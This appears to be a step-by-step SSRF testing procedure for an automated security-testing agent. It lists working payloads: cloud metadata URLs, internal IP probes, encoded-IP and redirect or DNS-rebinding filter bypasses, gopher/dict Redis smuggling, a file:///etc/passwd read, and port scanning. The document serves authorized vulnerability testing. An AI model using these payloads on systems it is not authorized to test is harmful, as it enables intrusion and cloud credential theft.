# Check SSRF

## Objective
Test whether user-controlled URLs or hostnames are fetched server-side without proper validation, enabling access to internal services, cloud metadata, or other restricted resources.

## Procedure

### Step 1: Identify server-side fetch parameters
Use `get_traffic` to find endpoints where the server fetches a user-supplied URL:
- URL/webhook parameters: `?url=`, `?src=`, `?href=`, `?link=`, `?feed=`, `?callback=`
- Image/file import: upload-from-URL features, avatar-from-URL, PDF generation from URL
- Proxy/preview features: link previews, URL shorteners, screenshot services
- Webhook configuration endpoints
- XML/SVG processing (XXE-to-SSRF via DTD external entities)

### Step 2: Out-of-band detection
First confirm the server fetches URLs at all. Use a URL that you can monitor for incoming requests:
- Use `execute_request` to supply your controlled URL as the parameter value
- If you don't have an out-of-band server, use response-based detection (Step 3)

### Step 3: Response-based detection
If the server returns the fetched content or metadata:

**Localhost access:**
- `?url=http://127.0.0.1:80/` — does the response show the server's own homepage?
- `?url=http://localhost/server-status` — Apache status page
- `?url=http://[::1]/` — IPv6 localhost

**Cloud metadata (critical severity if accessible):**
- AWS: `?url=http://169.254.169.254/latest/meta-data/`
- GCP: `?url=http://metadata.google.internal/computeMetadata/v1/` (needs header `Metadata-Flavor: Google`)
- Azure: `?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01` (needs header `Metadata: true`)

**Internal network probing:**
- `?url=http://192.168.1.1/` — common gateway
- `?url=http://10.0.0.1/` — internal network
- `?url=http://172.16.0.1/` — internal network

### Step 4: Filter bypass attempts
If direct internal URLs are blocked:

**URL encoding:** `http://127.0.0.1/` as `http://%31%32%37%2e%30%2e%30%2e%31/`

**Alternative IP representations:**
- Decimal: `http://2130706433/` (= 127.0.0.1)
- Hex: `http://0x7f000001/`
- Octal: `http://0177.0.0.1/`
- Mixed: `http://127.0.0.1.nip.io/` (DNS rebinding via wildcard DNS)

**Redirect-based bypass:**
- Host an external URL that 302-redirects to `http://169.254.169.254/`
- If the server follows redirects, the initial URL check passes but the final fetch hits metadata

**DNS rebinding:**
- Use a domain that alternates between external and internal IPs
- First resolution passes allowlist, second resolution (during fetch) hits internal IP

**Protocol smuggling:**
- `gopher://127.0.0.1:6379/_SET%20key%20value` — Redis via gopher (if supported)
- `file:///etc/passwd` — local file read (if file:// protocol is supported)
- `dict://127.0.0.1:6379/info` — Redis info via dict protocol

### Step 5: Port scanning
If SSRF is confirmed, probe internal services:
- Common ports: 80, 443, 8080, 8443, 3000, 5000, 6379, 27017, 5432, 3306
- Measure response time differences to distinguish open (quick response) vs closed (timeout) ports

## Expected outcomes
- **found**: Server fetches user-supplied URL targeting internal resources or cloud metadata. Include exact request and evidence of internal content in response.
- **not_found**: Server validates URLs to prevent internal access (allowlist, no private IP ranges)
- **partial**: Server fetches URLs but blocks obvious internal targets. Filter may be bypassable with more research.
- **variant**: SSRF exists but is blind (no response content returned). Server makes the request but doesn't expose the response — still exploitable for cloud metadata credential theft.

## Output
- Parameters that trigger server-side fetch
- Internal resources accessible (if any)
- Cloud metadata accessible (if any — this is critical severity)
- Filter bypass techniques that worked
- Request IDs for evidence
